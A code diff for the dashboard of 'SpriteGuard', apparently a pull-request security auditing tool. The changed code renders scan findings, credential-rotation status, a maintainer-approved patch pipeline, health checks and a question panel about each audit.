+            ? `${v.testsAfter.summary}. Remaining head leaks: ${v.remainingLeaks.length}, flagged egress after: ${v.flaggedEgressAfter.length}.`
+            : `Patch applies cleanly; ${v.testsAfter.summary}.`;
+        }
+
+        const qs = [
+          ['What happened?', `${f.title} (${loc}).`],
+          ['Why does it matter?', f.exploitability],
+          ['What could happen?', f.runtimeProof || 'Exposed credentials or unguarded code paths can be abused with repository or runtime privileges.'],
+          ['What should I do?', f.remediation],
+          [
+            'Has it been fixed?',
+            `Code: ${codeFix}.` +
+              (isSec
+                ? ` Credential: ${st === 'exposed' ? 'still exposed' : `${CRED_META[st][0].toLowerCase()} (not verified with provider)`}.`
+                : ''),
+          ],
+          ['Has the fix been verified?', verifyText],
+        ];
+
+        const nextCred = CRED_ORDER[credIdx + 1];
+        const key = findingCredKey(scan, f, idx);
+        const trackerHtml = isSec
+          ? `<div class="tr">
+              <span class="trs">${CRED_ORDER.map(
+                (o, j) => `<em class="${j < credIdx ? 'done' : j === credIdx ? 'cur' : ''}">${CRED_META[o][0]}</em>`,
+              ).join('')}</span>
+              ${
+                nextCred
+                  ? `<button type="button" class="btn" data-rot="${esc(key)}::${esc(nextCred)}">Report ${
+                      nextCred === 'revoked' ? 'revocation' : 'rotation'
+                    }</button>`
+                  : `<small style="color:var(--ok)">Rotated, nothing left to do</small>`
+              }
+            </div>`
+          : '';
+
+        const staticLeak = (scan.report && scan.report.staticLeaks || []).find(
+          (l) => l.file === f.file && (l.line === f.line || !f.line),
+        );
+        const techRows = [
+          ['Finding ID', esc(f.id || 'Not reported')],
+          ['Detected by', esc(f.source || 'Not reported')],
+          ['Category', esc(f.category || 'Not reported')],
+          ['Confidence', f.confidence !== undefined ? `${Math.round(Number(f.confidence) * 100)}%` : 'Not reported'],
+          ['Location', esc(loc || 'Not reported')],
+          ['Evidence', `<code class="ev">${esc(f.evidence || 'Not reported')}</code>`],
+          ...(isSec
+            ? [
+                ['Fingerprint', esc(staticLeak ? staticLeak.fingerprint : 'Not reported')],
+                ['Entropy', staticLeak ? esc(String(staticLeak.entropy)) : 'Not reported'],
+                ['Last reported', esc(state.credTime[key] || 'None recorded')],
+              ]
+            : []),
+          ['Remediation', esc(f.remediation || 'Not reported')],
+        ];
+
+        return (
+          qs.map(([a, b]) => `<p><b>${esc(a)}</b> ${esc(b)}</p>`).join('') +
+          trackerHtml +
+          `<div style="margin-top:10px"><button type="button" class="btn" data-fp="${esc(scan.id)}::${idx}">Fix prompt for this finding</button></div>` +
+          `<details class="adv"><summary>Technical details</summary><dl>${techRows
+            .map(([k, v]) => `<dt>${k}</dt><dd>${v}</dd>`)
+            .join('')}</dl></details>`
+        );
+      }
+
+      function renderPatchPipeline(scan, patch) {
+        const v = patch && patch.verification;
+        const pushed = scan.status === 'pushed';
+        const isAi = patch && patch.generator === 'claude';
+        const stages = [];
+
+        stages.push([
+          'Generated',
+          isAi ? 'ai' : 'ok',
+          'Passed',
+          isAi ? 'AI patch generated' : 'Deterministic remediation drafted',
+        ]);
+
+        if (!v) {
+          stages.push(['Validated', 's', 'Not reported', 'No verification data stored']);
+          stages.push(['Tested', 's', 'Skipped', 'No test summary stored']);
+        } else {
+          const valClass = v.status === 'verified' ? 'ok' : v.status === 'verified_with_warnings' ? 'w' : 'err';
+          const valLabel =
+            v.status === 'verified' ? 'Passed' : v.status === 'verified_with_warnings' ? 'Passed with warnings' : 'Failed';
+          stages.push([
+            'Validated',
+            valClass,
+            valLabel,
+            `${v.resolvedFingerprints.length} leak(s) resolved, ${v.remainingLeaks.length} remaining`,
+          ]);
+
+          if (!v.testsAfter.ran) {
+            stages.push(['Tested', 's', 'Skipped', v.testsAfter.summary || 'No test suite configured']);
+          } else {
+            stages.push([
+              'Tested',
+              v.testsAfter.passed ? 'ok' : 'err',
+              v.testsAfter.passed ? 'Passed' : 'Failed',
+              v.testsAfter.summary,
+            ]);
+          }
+        }
+
+        if (pushed) {
+          const who = patch && patch.approvedBy ? `Approved by @${patch.approvedBy}` : 'Approved by maintainer';
+          stages.push(['Approval', 'ok', 'Passed', who]);
+          const shaNote = patch && patch.commitSha ? `Commit ${patch.commitSha.slice(0, 7)} pushed` : 'Committed to PR branch';
+          stages.push(['Pushed', 'ok', 'Passed', shaNote]);
+        } else if (scan.status === 'awaiting_approval') {
+          stages.push(['Approval', 'cur', 'Awaiting approval', 'Requires maintainer /spriteguard approve']);
+          stages.push(['Pushed', 'p', 'Not started', 'Blocked until approval']);
+        } else {
+          stages.push(['Approval', 'p', 'Not approved', `Scan status: ${scan.status}`]);
+          stages.push(['Pushed', 'p', 'Not started', 'Not pushed']);
+        }
+
+        return `<ol class="pl">${stages
+          .map(
+            ([name, cls, label, desc]) =>
+              `<li class="${cls}"><i></i><b>${esc(name)}</b><em>${esc(label)}</em><span>${esc(desc)}</span></li>`,
+          )
+          .join('')}</ol>`;
+      }
+
+      function renderDetail() {
+        const d = selectedScan();
+        const el = $('#detail');
+        if (!d) {
+          el.innerHTML = `<div class="emp">Select an audit from the feed, or run a demo / public GitHub PR scan above.</div>`;
+          return;
+        }
+
+        const cached = state.detailsCache[d.id];
+        const patch = d.patch || (cached && cached.patch) || null;
+        const findings = getFindings(d);
+        const nf = findings.length || Number(d.findingsCount || 0);
+        const crit = findings.filter((f) => f.severity === 'critical').length;
+        const ns = Number(d.secretsCount || 0);
+        const risk = Number(d.riskScore ?? 0);
+        const [sl, sc] = sevMeta(risk);
+        const isRunning = d.status === 'running' || d.status === 'queued';
+        const fin = !isRunning && d.status !== 'failed';
+        const isDemo = isPlaygroundScan(d);
+        const shortSha = (d.headSha || '').slice(0, 7) || '—';
+        const flaggedHosts = (d.egressDomains || []).filter((x) => x.flagged);
+        const isApproving = Boolean(state.approving[d.id]);
+        const isRescanning = Boolean(state.rescanning[d.id]);
+
+        let h = `<div class="dh">
+          <div style="min-width:0">
+            <div class="crumb">${esc(d.repoFullName)}#${esc(d.prNumber)} <span class="mono">${esc(shortSha)}</span></div>
+            <h2>${esc(d.prTitle)}</h2>
+          </div>
+          <div class="acts">
+            ${nf ? `<button type="button" class="btn" data-fp="${esc(d.id)}::all" title="Build a portable fix prompt">Fix prompt for whole PR</button>` : ''}
+            ${
+              !isRunning
+                ? `<button type="button" class="btn" id="rs-btn" ${isRescanning || isApproving ? 'disabled' : ''}${
+                    isRescanning ? ' aria-busy="true"' : ''
+                  }>${isRescanning ? 'Rescanning…' : 'Rescan'}</button>`
+                : ''
+            }
+            ${
+              d.status === 'awaiting_approval'
+                ? `<button type="button" class="btn pri" id="ap-btn" ${isApproving ? 'disabled aria-busy="true"' : ''}>${
+                    isApproving ? 'Waking Sprite &amp; Pushing…' : 'Approve patch <kbd>a</kbd>'
+                  }</button>`
+                : ''
+            }
+          </div>
+        </div>
+        <div class="facts">
+          <div>
+            <span class="l">Risk</span>
+            <b>${fin ? gauge(risk, sc) + risk : '–'}</b>
+            <small>${fin ? esc(sl + (crit ? `, ${crit} critical` : '')) : isRunning ? 'Scanning' : 'No result'}</small>
+          </div>
+          <div>
+            <span class="l">Findings</span>
+            <b>${fin ? nf : '–'}</b>
+            <small>${fin ? `${ns} secret${ns === 1 ? '' : 's'}` : 'No result'}</small>
+          </div>
+          <div>
+            <span class="l">Egress</span>
+            <b>${fin ? d.flaggedEgressCount : '–'}</b>
+            <small>${
+              fin
+                ? flaggedHosts.length
+                  ? esc(flaggedHosts.map((x) => x.host).join(', '))
+                  : (d.egressDomains || []).length
+                    ? `${d.egressDomains.length} allowlisted`
+                    : 'no outbound hosts'
+                : 'No result'
+            }</small>
+          </div>
+        </div>
+        <div class="sid">
+          <i class="sp ${esc(d.spriteState || 'none')}"></i>
+          <span>Sprite ${esc(d.spriteState || 'none')}</span>
+          ${d.spriteName ? `<code>${esc(d.spriteName)}</code><button type="button" class="btn" data-copy="${esc(d.spriteName)}">Copy</button>` : '<span>No sprite assigned</span>'}
+        </div>`;
+
+        if (isDemo) {
+          h += `<div class="bn d"><b>Demo fixture</b>Synthetic data; does not touch connected repositories.</div>`;
+        }
+        const vStatus = patch && patch.verification && patch.verification.status;
+        if (vStatus === 'verified_with_warnings' && d.status === 'awaiting_approval') {
+          const noteTxt = (patch.verification.notes || []).join(' ') || patch.verification.testsAfter.summary;
+          h += `<div class="bn"><b>Verified with warnings</b>${esc(noteTxt)}</div>`;
+        }
+        const stillExposed = countExposedSecrets([d]);
+        if ((d.status === 'awaiting_approval' || d.status === 'pushed') && stillExposed > 0) {
+          h += `<div class="bn e"><b>${stillExposed} credential${stillExposed > 1 ? 's' : ''} still exposed</b>${
+            d.status === 'pushed'
+              ? 'Patch pushed, but leaked keys remain valid until rotated.'
+              : 'Approving/pushing a code patch does not revoke leaked keys; revoke and rotate them at the provider.'
+          }</div>`;
+        }
+
+        if (isRunning) {
+          h += `<div class="pane"><ol class="steps">
+            <li class="done"><i></i>Create scan record &amp; provision isolated Sprite</li>
+            <li class="on"><i></i>Run 3-layer security audit &amp; patch verification</li>
+            <li><i></i>Checkpoint &amp; publish security report</li>
+          </ol></div>`;
+        } else {
+          const tabs = [
+            ['f', 'Findings' + (nf ? ` (${nf})` : '')],
+            ['p', 'Patch'],
+            ['m', 'PR Report'],
+            ['r', 'Raw JSON'],
+          ];
+          h += `<div class="tabs" role="tablist">${tabs
+            .map(
+              ([k, label]) =>
+                `<button type="button" role="tab" aria-selected="${k === state.tab}" data-t="${k}">${label}</button>`,
+            )
+            .join('')}</div><div class="pane">`;
+
+          if (state.tab === 'f') {
+            if (d.status === 'failed' || d.status === 'publish_failed') {
+              h += `<div class="note err" role="alert"><b>Audit error.</b> ${esc(d.error || 'The audit failed before completing.')}</div>`;
+            } else if (findings.length > 0) {
+              h += renderOverview(d, findings);
+              h += findings
+                .map((f, idx) => {
+                  const col = f.severity === 'critical' ? 'cr' : f.severity === 'high' ? 'hi' : f.severity === 'medium' ? 'md' : 'ok';
+                  const credSt = getCredStatus(d, f, idx);
+                  const credChip = credSt
+                    ? `<span class="chip" style="color:var(--${CRED_META[credSt][1]})">${CRED_META[credSt][0]}</span>`
+                    : '';
+                  const fKey = findingCredKey(d, f, idx);
+                  const isOpen = (!idx && !state.openFindingKey) || state.openFindingKey === fKey;
+                  const loc = f.line > 0 ? `${f.file}:${f.line}` : f.file;
+                  return `<details class="f" data-fkey="${esc(fKey)}" ${isOpen ? 'open' : ''}>
+                    <summary>
+                      <span class="sv" style="background:var(--${col})"></span>
+                      <span class="ft">${esc(f.title)}</span>
+                      <span class="fl">${esc(loc)}</span>
+                      <span class="chip" style="color:var(--${col})">${esc(f.severity)}</span>
+                      ${credChip}
+                    </summary>
+                    <div class="fb">${renderFindingBody(d, f, idx)}</div>
+                  </details>`;
+                })
+                .join('');
+            } else {
+              h += `<div class="note ok"><b>Audit finished with no findings.</b> Reflects only the layers and checks executed, not absolute proof of safety.</div>
+                <ul class="cl">
+                  <li><span>Findings</span><b>0 reported</b></li>
+                  <li><span>Credentials exposed</span><b>0</b></li>
+                  <li><span>Outbound hosts flagged</span><b>${d.flaggedEgressCount}</b></li>
+                  <li><span>Patch</span><b>None needed</b></li>
+                  <li><span>Egress probe</span><b>${esc((d.report && d.report.egress && d.report.egress.skipped) || 'Executed in isolated sandbox')}</b></li>
+                </ul>`;
+            }
+          } else if (state.tab === 'p') {
+            if (patch) {
+              h += renderPatchPipeline(d, patch);
+              h += renderUnifiedDiff(patch.diff || '');
+              if (patch.postMergeActions && patch.postMergeActions.length) {
+                h += `<div class="note" style="margin:12px 0 0"><b>Post-merge actions:</b><ul style="margin:6px 0 0;padding-left:18px">${patch.postMergeActions
+                  .map((a) => `<li>${esc(a)}</li>`)
+                  .join('')}</ul></div>`;
+              }
+            } else {
+              h += `<div class="note ok"><b>No patch for this audit.</b></div>`;
+            }
+          } else if (state.tab === 'm') {
+            const md = d.reportMarkdown || '';
+            h += `<div class="gh-comment">
+              <div class="gh-comment-head">
+                <div class="gh-author">
+                  <b>spriteguard</b>
+                  <span class="gh-bot-pill">bot</span>
+                  <span style="color:var(--mu)">commented on ${esc(d.repoFullName)}#${esc(d.prNumber)} · ${esc(shortSha)}</span>
+                </div>
+                <button type="button" class="btn" id="copy-md-btn" ${md ? '' : 'disabled'}>Copy Markdown</button>
+              </div>
+              <div class="gh-body">${renderMarkdownBlocks(md)}</div>
+            </div>`;
+          } else if (state.tab === 'r') {
+            const rawPayload = cached ? { scan: cached.scan, patch: cached.patch } : { scan: d, patch };
+            h += `<div style="display:flex;justify-content:flex-end;margin-bottom:8px">
+                <button type="button" class="btn" id="copy-json-btn">Copy JSON</button>
+              </div>
+              <pre class="raw">${esc(JSON.stringify(rawPayload, null, 2))}</pre>`;
+          }
+          h += `</div>`;
+        }
+
+        const threadItems = state.threads[d.id] || [];
+        const isAsking = Boolean(state.qaLoading[d.id]);
+        const draft = state.qaDrafts[d.id] || '';
+        const threadHtml = threadItems
+          .map((m) => {
+            const prov = m.a
+              ? m.usedAi
+                ? `Answered by ${m.provider || 'LLM'} (${m.model || 'configured'}) grounded in this scan`
+                : 'Answered by deterministic analyzer grounded in this scan'
+              : 'Reading the audit…';
+            return `<div class="me">${esc(m.q)}</div>
+              <div class="bot">${m.a ? renderMarkdownBlocks(m.a) : ''}<small>${esc(prov)}</small></div>`;
+          })
+          .join('');
+
+        h += `<div class="ask">
+          <div class="th" id="th">${threadHtml}</div>
+          <div class="chips">${['Why was this flagged?', 'Is it exploitable?', 'Why was egress flagged?']
+            .map((qText) => `<button type="button" data-ask="${esc(qText)}">${esc(qText)}</button>`)
+            .join('')}</div>
+          <form class="af" id="af">
+            <input id="qi" name="q" value="${esc(draft)}" ${isAsking ? 'disabled' : ''} placeholder="Ask @spriteguard about this PR" autocomplete="off" aria-label="Ask SpriteGuard" />
+            <button type="submit" class="btn ai" ${isAsking ? 'disabled aria-busy="true"' : ''}>${
+              isAsking ? 'Querying SpriteGuard…' : 'Ask'
+            }</button>
+          </form>
+        </div>`;
+
+        el.innerHTML = h;
+        const th = $('#th');
+        if (th) th.scrollTop = th.scrollHeight;
+      }
+
+      function renderAll() {
+        const activeEl = document.activeElement;
+        const wasAsking = activeEl && activeEl.id === 'qi';
+        const selStart = wasAsking ? activeEl.selectionStart : null;
+        const selEnd = wasAsking ? activeEl.selectionEnd : null;
+
+        renderGettingStarted();
+        renderStats();
+        renderList();
+        renderDetail();
+
+        if (wasAsking) {
+          const qi = $('#qi');
+          if (qi && !qi.disabled) {
+            qi.focus();
+            if (selStart !== null && selEnd !== null) {
+              try {
+                qi.setSelectionRange(selStart, selEnd);
+              } catch {}
+            }
+          }
+        }
+      }
+
+      function renderHealthUI() {
+        const h = state.health;
+        const envDot = $('#env-dot');
+        const envText = $('#env-text');
+        const btn = $('#hbtn');
+
+        if (!h) {
+          envDot.className = 'dot err';
+          envText.textContent = 'Offline';
+          btn.querySelector('.dot').className = 'dot err';
+          btn.querySelector('span').textContent = state.healthError
+            ? `System health: unreachable (${state.healthError})`
+            : 'System health: disconnected';
+        } else {
+          const isLocal = h.mode === 'local-sandbox';
+          envDot.className = 'dot' + (isLocal ? ' warn' : '');
+          envText.textContent = isLocal ? 'Local Sandbox' : 'Production';
+          const degraded = h.status !== 'ok' || !h.dbHealthy;
+          btn.querySelector('.dot').className = 'dot' + (degraded ? ' warn' : '');
+          btn.querySelector('span').textContent = degraded
+            ? 'System health: degraded'
+            : h.aiEnabled
+              ? 'All components healthy'
+              : 'Healthy (deterministic fallback active)';
+        }
+
+        const items = !h
+          ? [
+              ['Deterministic scanners', 'unknown', 'Backend /health unreachable'],
+              ['AI engine', 'unknown', state.healthError || 'Health endpoint unreachable'],
+              ['Fallback engine', 'unknown', 'Health endpoint unreachable'],
+              ['Neon pgvector store', 'unknown', 'Health endpoint unreachable'],
+              ['Split GitHub connectors', 'unknown', 'Health endpoint unreachable'],
+              ['Fly Sprites runtime', 'unknown', 'Health endpoint unreachable'],
+            ]
+          : [
+              [
+                'Deterministic scanners',
+                'ok',
+                'Layer A secret scanner & Layer B runtime egress probe online.',
+              ],
+              [
+                'AI engine',
+                h.aiEnabled ? 'ok' : 'degraded',
+                h.aiEnabled
+                  ? `Active provider: ${h.provider} (${h.model}).`
+                  : `No external LLM key configured (${h.provider}); deterministic fallback is handling audits.`,
+              ],
+              [
+                'Fallback engine',
+                'ok',
+                'Deterministic heuristic auditor, patcher, and grounded Q&A ready.',
+              ],
+              [
+                'Neon pgvector store',
+                h.dbHealthy ? 'ok' : 'down',
+                h.dbHealthy
+                  ? h.store === 'postgres'
+                    ? 'Connected to Neon Postgres + pgvector.'
+                    : 'Connected to in-memory vector store (LOCAL_SANDBOX_MODE).'
+                  : 'Database ping failed.',
+              ],
+              [
+                'Split GitHub connectors',
+                'ok',
+                `Read-Only & Trusted Write connectors separated (mode: ${h.githubMode}).`,
+              ],
+              [
+                'Fly Sprites runtime',
+                h.spriteDriver === 'fly-sprites' ? 'ok' : 'degraded',
+                h.spriteDriver === 'fly-sprites'
+                  ? 'Hardware-isolated Firecracker Sprites active.'
+                  : 'Running with local-sandbox driver (LOCAL_SANDBOX_MODE).',
+              ],
+            ];
+
+        $('#hm').textContent = h
+          ? `Reported live by GET /health at ${new Date(h.timestamp || Date.now()).toLocaleTimeString()}.`
+          : 'Could not reach GET /health. Component statuses shown as unknown.';
+
+        $('#hl').innerHTML = items
+          .map(([label, st, detail]) => {
+            const badge = st === 'ok' ? 'Healthy' : st === 'degraded' ? 'Fallback' : st === 'down' ? 'Down' : 'Unknown';
+            return `<li><div><b>${esc(label)}</b><em class="hs ${esc(st)}">${esc(badge)}</em></div><p>${esc(detail)}</p></li>`;
+          })
+          .join('');
+      }
+
+      async function fetchScanDetail(scanId) {
+        try {
+          const res = await fetch('/api/scans/' + encodeURIComponent(scanId), { headers: authHeaders() });
+          if (!res.ok) return;
+          const data = await res.json();
+          state.detailsCache[scanId] = data;
+          if (state.selId === scanId) renderDetail();
+        } catch {}
+      }
+
+      async function refreshAll(force = false) {
+        if (!force) {
+          const ae = document.activeElement;
+          const typing = ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT');
+          const modalOpen = Boolean(document.querySelector('dialog[open]'));
+          if (typing || modalOpen) return;
+        }
+
+        try {
+          const [scansRes, healthRes] = await Promise.allSettled([
+            fetch('/api/scans', { headers: authHeaders() }),
+            fetch('/health', { headers: { accept: 'application/json' } }),
+          ]);
+
+          if (healthRes.status === 'fulfilled' && healthRes.value.ok) {
+            state.health = await healthRes.value.json();
+            state.healthError = '';
+          } else if (healthRes.status === 'fulfilled') {
+            try {
+              state.health = await healthRes.value.json();
+            } catch {
+              state.health = null;
+            }
+            state.healthError = `HTTP ${healthRes.value.status}`;
+          } else {
+            state.health = null;
+            state.healthError = healthRes.reason?.message || 'network error';
+          }
+          renderHealthUI();
+
+          if (scansRes.status !== 'fulfilled') throw scansRes.reason;
+          const res = scansRes.value;
+          if (res.status === 401) {
+            const entered = prompt('Enter SpriteGuard DASHBOARD_TOKEN:');
+            if (entered) {
+              ls('sg_dashboard_token', entered.trim());
+              return refreshAll(true);
+            }
+            return;
+          }
+          const data = await res.json();
+          state.mode = data.mode;
+          state.playgroundEnabled = Boolean(data.playgroundEnabled || data.mode === 'local-sandbox');
+          state.storeBackend = data.storeBackend || '—';
+          state.provider = data.provider || '—';
+          state.model = data.model || '—';
+          state.scans = data.scans || [];
+
+          const pgHead = $('#pg-tabs');
+          const pgPane = $('#pg-fixtures');
+          const customPane = $('#custom-form');
+          if (!state.playgroundEnabled) {
+            pgHead.style.display = 'none';
+            pgPane.hidden = true;
+            customPane.hidden = true;
+          } else {
+            pgHead.style.display = '';
+            pgPane.hidden = state.pgTab !== 'fixtures';
+            customPane.hidden = state.pgTab !== 'custom';
+          }
+
+          if (!state.selId || !state.scans.some((s) => s.id === state.selId)) {
+            const vis = visibleScans();
+            state.selId = (vis[0] || state.scans[0] || {}).id || null;
+          }
+
+          renderAll();
+        } catch (err) {
+          renderHealthUI();
+        }
+      }
+
+      async function runDemoAudit() {
+        if (state.runningDemo) return;
+        const kind = $('#scn').value;
+        const btn = $('#demo-btn');
+        state.runningDemo = true;
+        btn.disabled = true;
+        btn.setAttribute('aria-busy', 'true');
+        btn.textContent = 'Running audit…';
+        $('#scn').disabled = true;
+        try {
+          const res = await fetch('/api/demo/trigger', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...authHeaders() },
+            body: JSON.stringify({ kind }),
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || 'Demo audit failed');
+          ls('sg-demo', '1');
+          state.selId = data.scan.id;
+          state.detailsCache[data.scan.id] = data;
+          state.tab = 'f';
+          await refreshAll(true);
+          toast(`Demo audit complete: ${data.scan.findingsCount} finding(s), risk ${data.scan.riskScore}/100`);
+        } catch (err) {
+          toast('Demo failed: ' + err.message, true);
+        } finally {
+          state.runningDemo = false;
+          btn.disabled = false;
+          btn.removeAttribute('aria-busy');
+          btn.textContent = 'Run demo audit';
+          $('#scn').disabled = false;
+        }
       }
 
       async function runCustomAudit(ev) {
         ev.preventDefault();
-        const btn = document.getElementById('run-custom-btn');
-        const title = document.getElementById('custom-title').value.trim();
-        const filename = document.getElementById('custom-filename').value.trim();
-        const code = document.getElementById('custom-code').value;
+        if (state.runningCustom) return;
+        const title = $('#custom-title').value.trim();
+        const filename = $('#custom-file').value.trim();
+        const code = $('#custom-code').value;
         if (!code.trim()) {
-          toast('Paste code or choose an attack preset first.', 'error');
+          toast('Paste code or choose an attack preset first.', true);
           return;
         }
+        const btn = $('#custom-btn');
+        state.runningCustom = true;
         btn.disabled = true;
-        btn.innerHTML = '<span class="spinner"></span>Auditing in Isolated Sprite...';
+        btn.setAttribute('aria-busy', 'true');
+        btn.textContent = 'Auditing…';
         try {
           const res = await fetch('/api/demo/custom', {
             method: 'POST',
@@ -1528,58 +3399,552 @@
           });
           const data = await res.json();
           if (!res.ok) throw new Error(data.error || 'Custom audit failed');
-          state.expandedId = data.scan.id;
-          toast('Custom PR #' + data.scan.prNumber + ' audited (Risk ' + data.scan.riskScore + '/100)', 'success');
-          await fetchScans();
+          ls('sg-demo', '1');
+          state.selId = data.scan.id;
+          state.detailsCache[data.scan.id] = data;
+          state.tab = 'f';
+          await refreshAll(true);
+          toast(`Custom PR #${data.scan.prNumber} audited: risk ${data.scan.riskScore}/100`);
         } catch (err) {
-          toast('Error: ' + err.message, 'error');
+          toast('Custom audit failed: ' + err.message, true);
         } finally {
+          state.runningCustom = false;
           btn.disabled = false;
-          btn.textContent = 'Run Zero-Trust Audit';
+          btn.removeAttribute('aria-busy');
+          btn.textContent = 'Run zero-trust audit';
         }
       }
 
+      async function runPublicUrlAudit(ev) {
+        ev.preventDefault();
+        if (state.runningUrl) return;
+        const url = $('#gh-url').value.trim();
+        if (!url) {
+          toast('Enter a GitHub PR URL or owner/repo.', true);
+          $('#gh-url').focus();
+          return;
+        }
+        const btn = $('#url-btn');
+        state.runningUrl = true;
+        btn.disabled = true;
+        btn.setAttribute('aria-busy', 'true');
+        btn.textContent = 'Scanning…';
+        try {
+          const res = await fetch('/api/github/audit-url', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...authHeaders() },
+            body: JSON.stringify({ url }),
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
+          state.selId = data.scan.id;
+          state.detailsCache[data.scan.id] = data;
+          state.tab = 'f';
+          await refreshAll(true);
+          toast(`Scanned ${data.scan.repoFullName}#${data.scan.prNumber} (Risk ${data.scan.riskScore}/100)`);
+        } catch (err) {
+          toast(err.message, true);
+        } finally {
+          state.runningUrl = false;
+          btn.disabled = false;
+          btn.removeAttribute('aria-busy');
+          btn.textContent = 'Scan PR';
+        }
+      }
+
+      function promptApprove() {
+        const d = selectedScan();
+        if (!d || d.status !== 'awaiting_approval' || state.approving[d.id]) return;
+        const isDemo = isPlaygroundScan(d);
+        $('#dlg-title').textContent = isDemo ? 'Approve and commit playground patch?' : 'Maintainer approval required on GitHub';
+        if (isDemo) {
+          $('#dmsg').textContent = `This will wake Sprite ${d.spriteName || ''}, verify the diff SHA-256, and commit the patch to ${d.repoFullName}#${d.prNumber}. Keys in earlier git history must still be rotated.`;
+          $('#dlg-cmd-box').hidden = true;
+          $('#dlg-ok').textContent = 'Approve and push';
+          $('#dlg-ok').dataset.mode = 'demo';
+        } else {
+          $('#dmsg').textContent = `For zero-trust split-connector safety, production PR approvals are triggered directly by repository maintainers commenting on ${d.repoFullName}#${d.prNumber}. Copy and post this command on the PR:`;
+          $('#dlg-cmd-box').hidden = false;
+          $('#dlg-ok').textContent = 'Open PR on GitHub';
+          $('#dlg-ok').dataset.mode = 'github';
+        }
+        $('#dlg').showModal();
+      }
+
+      $('#dlg').addEventListener('close', async () => {
+        if ($('#dlg').returnValue !== 'ok') {
+          $('#dlg').returnValue = '';
+          return;
+        }
+        $('#dlg').returnValue = '';
+        const d = selectedScan();
+        if (!d) return;
+
+        if ($('#dlg-ok').dataset.mode === 'github') {
+          window.open(`https://github.com/${d.repoFullName}/pull/${d.prNumber}`, '_blank', 'noopener,noreferrer');
+          return;
+        }
+
+        state.approving[d.id] = true;
+        renderDetail();
+        try {
+          const res = await fetch('/api/demo/scans/' + encodeURIComponent(d.id) + '/approve', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...authHeaders() },
+            body: JSON.stringify({ approver: 'alice-maintainer' }),
+          });
+          const out = await res.json();
+          if (!res.ok || !out.ok) throw new Error(out.reason || out.error || 'Approval rejected');
+          delete state.detailsCache[d.id];
+          await refreshAll(true);
+          const rem = countExposedSecrets([selectedScan() || d]);
+          toast(
+            rem
+              ? `Patch pushed (${(out.commitSha || '').slice(0, 7)}). ${rem} credential(s) still need revoking.`
+              : `Patch pushed (${(out.commitSha || '').slice(0, 7)})`,
+          );
+        } catch (err) {
+          toast('Approval failed: ' + err.message, true);
+        } finally {
+          delete state.approving[d.id];
+          renderDetail();
+        }
+      });
+
+      async function rescanSelected() {
+        const d = selectedScan();
+        if (!d || state.rescanning[d.id]) return;
+        state.rescanning[d.id] = true;
+        renderDetail();
+        try {
+          const res = await fetch('/api/scans/' + encodeURIComponent(d.id) + '/rescan', {
+            method: 'POST',
+            headers: authHeaders(),
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || 'Rescan failed');
+          if (data.scan) {
+            state.selId = data.scan.id;
+            state.detailsCache[data.scan.id] = data;
+            await refreshAll(true);
+            toast(`Rescan complete: ${data.scan.repoFullName}#${data.scan.prNumber}`);
+          } else {
+            toast(`Rescan queued for ${d.repoFullName}#${d.prNumber}`);
+            await refreshAll(true);
+          }
+        } catch (err) {
+          toast('Rescan failed: ' + err.message, true);
+        } finally {
+          delete state.rescanning[d.id];
+          renderDetail();
+        }
+      }
+
+      async function askQuestion(question) {
+        const d = selectedScan();
+        if (!d || state.qaLoading[d.id]) return;
+        const entry = { q: question, a: null, provider: '', model: '', usedAi: false };
+        (state.threads[d.id] = state.threads[d.id] || []).push(entry);
+        state.qaLoading[d.id] = true;
+        state.qaDrafts[d.id] = '';
+        renderDetail();
+
+        try {
+          const res = await fetch('/api/scans/' + encodeURIComponent(d.id) + '/ask', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', ...authHeaders() },
+            body: JSON.stringify({ question, asker: 'dashboard-user' }),
+          });
+          const data = await res.json();
+          if (!res.ok) throw new Error(data.error || 'Q&A failed');
+          entry.a = data.answer || 'No response';
+          entry.provider = data.provider || state.provider;
+          entry.model = data.model || state.model;
+          entry.usedAi = Boolean(data.usedAi);
+        } catch (err) {
+          entry.a = `Error: ${err.message}`;
+        } finally {
+          delete state.qaLoading[d.id];
+          renderDetail();
+        }
+      }
+
+      function openFixPrompt(scanId, target) {
+        const d = state.scans.find((s) => s.id === scanId);
+        const findings = d ? getFindings(d) : [];
+        if (!d || !findings.length) {
+          toast('No findings to fix in this audit');
+          return;
+        }
+        const indices = target === 'all' ? findings.map((_, i) => i) : [Number(target)];
+        const picked = indices.map((i) => findings[i]).filter(Boolean);
+        const hasSecrets = picked.some(isSecretFinding);
+        const hasEgress = picked.some((f) => f.category === 'malicious_egress');
+        const [sevLabel] = sevMeta(d.riskScore);
+
+        const promptText = [
+          `Fix ${picked.length > 1 ? 'these security findings' : 'this security finding'} in ${d.repoFullName}, PR #${d.prNumber}, commit ${(d.headSha || '').slice(0, 7)}.`,
+          isPlaygroundScan(d) ? 'This is a synthetic SpriteGuard playground fixture. Do not apply it to a production repo.' : null,
+          `Context: SpriteGuard rated this PR ${d.riskScore ?? 0}/100 (${sevLabel}).`,
+          '',
+          'Findings:',
+          ...picked.map(
+            (f, n) =>
+              `${n + 1}. ${f.title} (${f.severity}) at ${f.file}:${f.line}\n   Evidence (redacted): ${f.evidence}\n   Exploitability: ${f.exploitability}`,
+          ),
+          '',
+          'Required changes:',
+          ...(hasSecrets
+            ? [
+                '- Remove each literal secret from source code and load it from environment variables / secret manager instead.',
+                '- Never write raw secrets in code, tests, or logs.',
+              ]
+            : []),
+          ...(hasEgress
+            ? ['- Remove unexpected outbound network calls or document and allowlist legitimate domains.']
+            : []),
+          '- Fix any injection, crypto, or configuration vulnerabilities listed above.',
+          '',
+          'Constraints:',
+          '- Keep changes minimal and scoped strictly to these security findings.',
+          '- Run existing tests and linters and confirm zero secret literals remain.',
+        ]
+          .filter((x) => x !== null)
+          .join('\n');
+
+        $('#fpt').value = promptText;
+        $('#fpd-title').textContent =
+          picked.length > 1 ? `Fix prompt for whole PR (${picked.length} findings)` : 'Fix prompt for one finding';
+        $('#fpd').showModal();
+      }
+
       function openConnectModal() {
